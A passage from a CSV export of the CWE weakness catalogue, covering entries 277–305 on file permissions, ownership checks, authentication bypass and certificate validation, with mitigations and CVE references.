Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:The architecture needs to access and modification attributes for files to only those users who actually require those actions.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"::REFERENCE:CVE-2005-1941:DESCRIPTION:Executables installed world-writable.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1941::REFERENCE:CVE-2002-1713:DESCRIPTION:Home directories installed world-readable.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1713::REFERENCE:CVE-2001-1550:DESCRIPTION:World-writable log files allow information loss; world-readable file has cleartext passwords.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1550::REFERENCE:CVE-2002-1711:DESCRIPTION:World-readable directory.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1711::REFERENCE:CVE-2002-1844:DESCRIPTION:Windows product uses insecure permissions when installing on Solaris (genesis: port error).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1844::REFERENCE:CVE-2001-0497:DESCRIPTION:Insecure permissions for a shared secret key file. Overlaps cryptographic problem.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0497::REFERENCE:CVE-1999-0426:DESCRIPTION:Default permissions of a device allow IP spoofing.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0426::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insecure Default Permissions::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO06-C:ENTRY NAME:Create files with appropriate access permissions::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO01-J:ENTRY NAME:Create files with appropriate access permission::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.08::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 2.1::\",::1::127::81::,\"\",\n277,\"Insecure Inherited Permissions\",Variant,Draft,\"A product defines a set of insecure permissions that are inherited by objects that are created by the program.\",\"\",::NATURE:ChildOf:CWE ID:732:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"::REFERENCE:CVE-2005-1841:DESCRIPTION:User's umask is used when creating temp files.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1841::REFERENCE:CVE-2002-1786:DESCRIPTION:Insecure umask for core dumps [is the umask preserved or assigned?].:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1786::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insecure inherited permissions::\",,\"\",\n278,\"Insecure Preserved Inherited Permissions\",Variant,Incomplete,\"A product inherits a set of insecure permissions for an object, e.g. when copying from an archive file, without user awareness or involvement.\",\"\",::NATURE:ChildOf:CWE ID:732:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"::REFERENCE:CVE-2005-1724:DESCRIPTION:Does not obey specified permissions when exporting.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1724::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insecure preserved inherited permissions::\",,\"\",\n279,\"Incorrect Execution-Assigned Permissions\",Variant,Draft,\"While it is executing, the product sets the permissions of an object in a way that violates the intended permissions that have been specified by the user.\",\"\",::NATURE:ChildOf:CWE ID:732:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Architecture and Design::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"::REFERENCE:CVE-2002-0265:DESCRIPTION:Log files opened read/write.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0265::REFERENCE:CVE-2003-0876:DESCRIPTION:Log files opened read/write.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0876::REFERENCE:CVE-2002-1694:DESCRIPTION:Log files opened read/write.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1694::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insecure execution-assigned permissions::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO06-C:ENTRY NAME:Create files with appropriate access permissions::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO01-J:ENTRY NAME:Create files with appropriate access permission::\",::81::,\"\",\n280,\"Improper Handling of Insufficient Permissions or Privileges \",Base,Draft,\"The product does not handle or incorrectly handles when it has insufficient privileges to access resources or functionality as specified by their permissions. This may cause it to follow unexpected code paths that may leave the product in an invalid state.\",\"\",::NATURE:ChildOf:CWE ID:755:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Other:IMPACT:Other:IMPACT:Alter Execution Logic::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation:DESCRIPTION:Always check to see if you have successfully accessed a resource or system functionality, and use proper error handling if it is unsuccessful. Do this even when you are operating in a highly privileged mode, because errors or environmental conditions might still cause a failure. For example, environments with highly granular permissions/privilege models, such as Windows or Linux capabilities, can cause unexpected failures.::\",\"::REFERENCE:CVE-2003-0501:DESCRIPTION:Special file system allows attackers to prevent ownership/permission change of certain entries by opening the entries before calling a setuid program.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0501::REFERENCE:CVE-2004-0148:DESCRIPTION:FTP server places a user in the root directory when the user's permissions prevent access to the their own home directory.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0148::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Fails poorly due to insufficient permissions::TAXONOMY NAME:WASC:ENTRY ID:17:ENTRY NAME:Improper Filesystem Permissions::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"::TYPE:Maintenance:NOTE:CWE-280 and CWE-274 are too similar. It is likely that CWE-274 will be deprecated in the future.::TYPE:Relationship:NOTE:This can be both primary and resultant. When primary, it can expose a variety of weaknesses because a resource might not have the expected state, and subsequent operations might fail. It is often resultant from Unchecked Error Condition (CWE-391).::TYPE:Theoretical:NOTE:Within the context of vulnerability theory, privileges and permissions are two sides of the same coin. Privileges are associated with actors, and permissions are associated with resources. To perform access control, at some point the software makes a decision about whether the actor (and the privileges that have been assigned to that actor) is allowed to access the resource (based on the permissions that have been specified for that resource).::TYPE:Research Gap:NOTE:This type of issue is under-studied, since researchers often concentrate on whether an object has too many permissions, instead of not enough. These weaknesses are likely to appear in environments with fine-grained models for permissions and privileges, which can include operating systems and other large-scale software packages. However, even highly simplistic permission/privilege models are likely to contain these issues if the developer has not considered the possibility of access failure.::\",\n281,\"Improper Preservation of Permissions\",Base,Draft,\"The product does not preserve permissions or incorrectly preserves permissions when copying, restoring, or sharing objects, which can cause them to have less restrictive permissions than intended.\",\"\",::NATURE:ChildOf:CWE ID:732:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:732:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Resultant:DESCRIPTION:This is resultant from errors that prevent the permissions from being preserved.::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"\",\"\",\"::REFERENCE:CVE-2002-2323:DESCRIPTION:Incorrect ACLs used when restoring backups from directories that use symbolic links.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2323::REFERENCE:CVE-2001-1515:DESCRIPTION:Automatic modification of permissions inherited from another file system.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1515::REFERENCE:CVE-2005-1920:DESCRIPTION:Permissions on backup file are created with defaults, possibly less secure than original file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1920::REFERENCE:CVE-2001-0195:DESCRIPTION:File is made world-readable when being cloned.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0195::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Permission preservation failure::\",,\"\",\n283,\"Unverified Ownership\",Base,Draft,\"The product does not properly verify that a critical resource is owned by the proper entity.\",\"\",::NATURE:ChildOf:CWE ID:282:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:An attacker could gain unauthorized access to system resources.::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.::\",\"::REFERENCE:CVE-2001-0178:DESCRIPTION:Program does not verify the owner of a UNIX socket that is used for sending a password.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0178::REFERENCE:CVE-2004-2012:DESCRIPTION:Owner of special device not checked, allowing root.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2012::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unverified Ownership::\",,\"::TYPE:Relationship:NOTE:This overlaps insufficient comparison, verification errors, permissions, and privileges.::\",\n289,\"Authentication Bypass by Alternate Name\",Base,Incomplete,\"The product performs authentication based on the name of a resource being accessed, or the name of the actor performing the access, but it does not properly check all possible names for that resource or actor.\",\"\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2003-0317:DESCRIPTION:Protection mechanism that restricts URL access can be bypassed using URL encoding.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0317::REFERENCE:CVE-2004-0847:DESCRIPTION:Bypass of authentication for files using (backslash) or %5C (encoded backslash).:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0847::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Authentication bypass by alternate name::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS01-J:ENTRY NAME:Normalize strings before validating them:MAPPING FIT:CWE More Specific::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:IDS01-J:ENTRY NAME:Normalize strings before validating them:MAPPING FIT:CWE More Specific::\",,\"::TYPE:Relationship:NOTE:Overlaps equivalent encodings, canonicalization, authorization, multiple trailing slash, trailing space, mixed case, and other equivalence issues.::TYPE:Theoretical:NOTE:Alternate names are useful in data driven manipulation attacks, not just for authentication.::\",\n290,\"Authentication Bypass by Spoofing\",Base,Incomplete,\"This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks.\",\"\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:This weakness can allow an attacker to access resources which are not otherwise accessible without proper authentication.::\",\"\",\"\",\"::REFERENCE:CVE-2022-30319:DESCRIPTION:S-bus functionality in a home automation product performs access control using an IP allowlist, which can be bypassed by a forged IP address.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30319::REFERENCE:CVE-2009-1048:DESCRIPTION:VOIP product allows authentication bypass using 127.0.0.1 in the Host header.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1048::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Authentication bypass by spoofing::\",::21::22::459::461::473::476::59::60::667::94::,\"::TYPE:Relationship:NOTE:This can be resultant from insufficient verification.::\",\n294,\"Authentication Bypass by Capture-replay\",Base,Incomplete,\"A capture-replay flaw exists when the design of the product makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).\",\"Capture-replay attacks are common and can be difficult to defeat without cryptography. They are a subset of network injection attacks that rely on observing previously-sent valid commands, then changing them slightly if necessary and resending the same commands to the server.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:Messages sent with a capture-relay attack allow access to resources which are not otherwise accessible without proper authentication.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Utilize some sequence or time stamping functionality along with a checksum which takes this into account in order to ensure that messages can be parsed only once.::PHASE:Architecture and Design:DESCRIPTION:Since any attacker who can listen to traffic can see sequence numbers, it is necessary to sign messages with some kind of cryptography to ensure that sequence numbers are not simply doctored along with content.::\",\"::REFERENCE:CVE-2005-3435:DESCRIPTION:product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3435::REFERENCE:CVE-2007-4961:DESCRIPTION:Chain: cleartext transmission of the MD5 hash of password (CWE-319) enables attacks against a server that is susceptible to replay (CWE-294).:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4961::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Authentication bypass by replay::TAXONOMY NAME:CLASP:ENTRY NAME:Capture-replay::\",::102::509::555::561::60::644::645::652::701::94::,\"\",\n295,\"Improper Certificate Validation\",Base,Draft,\"The product does not validate, or incorrectly validates, a certificate.\",\"When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by interfering in the communication path between the host and client. The product might connect to a malicious host while believing it is a trusted host, or the product might be deceived into accepting spoofed data that appears to originate from a trusted host.\",::NATURE:ChildOf:CWE ID:287:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::NATURE:PeerOf:CWE ID:322:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"::A certificate is a token that associates an identity (principal) to a cryptographic key. Certificates can be used to check if a public key belongs to the assumed owner.::\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Implementation:NOTE:When the product uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Authentication:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Man-in-the-middle attack tool:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Certificates should be carefully managed and checked to assure that data are encrypted with the intended owner's public key.::PHASE:Implementation:DESCRIPTION:If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname.::\",\"::REFERENCE:CVE-2019-12496:DESCRIPTION:A Go framework for robotics, drones, and IoT devices skips verification of root CA certificates by default.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-12496::REFERENCE:CVE-2014-1266:DESCRIPTION:chain: incorrect goto in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple goto fail bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).:LINK:https://www.cve.org/CVERecord?id=CVE-2014-1266::REFERENCE:CVE-2021-22909:DESCRIPTION:Chain: router's firmware update procedure uses curl with -k (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22909::REFERENCE:CVE-2008-4989:DESCRIPTION:Verification function trusts certificate chains in which the last certificate is self-signed.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4989::REFERENCE:CVE-2012-5821:DESCRIPTION:Web browser uses a TLS-related function incorrectly, preventing it from verifying that a server's certificate is signed by a trusted certification authority (CA):LINK:https://www.cve.org/CVERecord?id=CVE-2012-5821::REFERENCE:CVE-2009-3046:DESCRIPTION:Web browser does not check if any intermediate certificates are revoked.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-3046::REFERENCE:CVE-2011-0199:DESCRIPTION:Operating system does not check Certificate Revocation List (CRL) in some cases, allowing spoofing using a revoked certificate.:LINK:https://www.cve.org/CVERecord?id=CVE-2011-0199::REFERENCE:CVE-2012-5810:DESCRIPTION:Mobile banking application does not verify hostname, leading to financial loss.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-5810::REFERENCE:CVE-2012-3446:DESCRIPTION:Cloud-support library written in Python uses incorrect regular expression when matching hostname.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-3446::REFERENCE:CVE-2009-2408:DESCRIPTION:Web browser does not correctly handle '0' character (NUL) in Common Name, allowing spoofing of https sites.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2408::REFERENCE:CVE-2012-2993:DESCRIPTION:Smartphone device does not verify hostname, allowing spoofing of mail services.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-2993::REFERENCE:CVE-2012-5822:DESCRIPTION:Application uses third-party library that does not validate hostname.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-5822::REFERENCE:CVE-2012-5819:DESCRIPTION:Cloud storage management application does not validate hostname.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-5819::REFERENCE:CVE-2012-5817:DESCRIPTION:Java library uses JSSE SSLSocket and SSLEngine classes, which do not verify the hostname.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-5817::REFERENCE:CVE-2010-1378:DESCRIPTION:chain: incorrect calculation allows attackers to bypass certificate checks.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-1378::REFERENCE:CVE-2005-3170:DESCRIPTION:LDAP client accepts certificates even if they are not from a trusted CA.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3170::REFERENCE:CVE-2009-0265:DESCRIPTION:chain: DNS server does not correctly check return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0265::REFERENCE:CVE-2003-1229:DESCRIPTION:chain: product checks if client is trusted when it intended to check if the server is trusted, allowing validation of signed code.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1229::REFERENCE:CVE-2002-0862:DESCRIPTION:Cryptographic API, as used in web browsers, mail clients, and other software, does not properly validate Basic Constraints.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0862::REFERENCE:CVE-2009-1358:DESCRIPTION:chain: OS package manager does not check properly check the return value, allowing bypass using a revoked certificate.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1358::\",,,\"::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A10:ENTRY NAME:Insecure Configuration Management:MAPPING FIT:CWE More Specific::\",::459::475::,\"\",\n301,\"Reflection Attack in an Authentication Protocol\",Base,Draft,\"Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user.\",\"A mutual authentication protocol requires each party to respond to a random challenge by the other party by encrypting it with a pre-shared key. Often, however, such protocols employ the same pre-shared key for communication with a number of different entities. A malicious user or an attacker can easily compromise this protocol without possessing the correct key by employing a reflection attack on the protocol. Reflection attacks capitalize on mutual authentication schemes in order to trick the target into revealing the secret shared between it and another valid user. In a basic mutual-authentication scheme, a secret is known to both the valid user and the server; this allows them to authenticate. In order that they may verify this shared secret without sending it plainly over the wire, they utilize a Diffie-Hellman-style scheme in which they each pick a value, then request the hash of that value as keyed by the shared secret. In a reflection attack, the attacker claims to be a valid user and requests the hash of a random value from the server. When the server returns this value and requests its own value to be hashed, the attacker opens another connection to the server. This time, the hash requested by the attacker is the value which the server requested in the first connection. When the server returns this hashed value, it is used in the first connection, authenticating the attacker successfully as the impersonated valid user.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:327:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:The primary result of reflection attacks is successful authentication with a target machine -- as an impersonated user.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Use different keys for the initiator and responder or of a different type of challenge for the initiator and responder.::PHASE:Architecture and Design:DESCRIPTION:Let the initiator prove its identity before proceeding.::\",\"::REFERENCE:CVE-2005-3435:DESCRIPTION:product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3435::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Reflection attack in an auth protocol::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A7:ENTRY NAME:Broken Authentication and Session Management:MAPPING FIT:CWE More Specific::\",::90::,\"::TYPE:Maintenance:NOTE:The term reflection is used in multiple ways within CWE and the community, so its usage should be reviewed.::\",\n303,\"Incorrect Implementation of Authentication Algorithm\",Base,Draft,\"The requirements for the product dictate the use of an established authentication algorithm, but the implementation of the algorithm is incorrect.\",\"This incorrect implementation may allow authentication to be bypassed.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::REFERENCE:CVE-2003-0750:DESCRIPTION:Conditional should have been an 'or' not an 'and'.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0750::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Authentication Logic Error::\",::90::,\"\",\n305,\"Authentication Bypass by Primary Weakness\",Base,Draft,\"The authentication algorithm is sound, but the implemented mechanism can be bypassed as the result of a separate weakness that is primary to the authentication error.\",\"\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::REFERENCE:CVE-2002-1374:DESCRIPTION:The provided password is only compared against the first character of the real password.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1374::REFERENCE:CVE-2000-0979:DESCRIPTION:The password is not properly checked, which allows remote attackers to bypass access controls by sending a 1-byte password that matches the first character of the real password.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0979::REFERENCE:CVE-2001-0088:DESCRIPTION:Chain: Forum software does not properly initialize an array, which 